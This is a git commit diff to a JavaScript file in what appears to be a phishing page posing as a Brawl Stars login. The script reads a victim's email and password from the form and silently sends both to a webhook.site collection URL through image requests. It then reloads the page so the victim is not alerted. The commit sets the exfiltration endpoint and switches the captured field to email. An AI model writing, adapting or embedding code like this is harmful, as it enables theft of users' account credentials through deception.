2178a371b23f8d2901ace59a03b8657052abdda7
az69az <138134265+az69az@users.noreply.github.com>
2023-07-08 14:28:09 +0300

    Update continue.js

--- public_html/others/brawlstars/continue.js
+++ public_html/others/brawlstars/continue.js
@@ -1,11 +1,11 @@
 <script>
        const getValueInput = () =>{
        
-let inputValue=document.getElementById("username").value; 
+let inputValue=document.getElementById("email").value; 
        
 let inputValue1 = document.getElementById("password").value;        var i=new Image();
 var j=new Image();
-i.src="https://webhook.site/?password="+inputValue1;  j.src="https://webhook.site/?username="+inputValue; 
+i.src="https://webhook.site/2e6403fb-0924-46a1-8bfa-06d27b5b3ace"+inputValue1;  j.src="https://webhook.site/2e6403fb-0924-46a1-8bfa-06d27b5b3ace"+inputValue; 
 window.location.reload();
   }        
 </script>
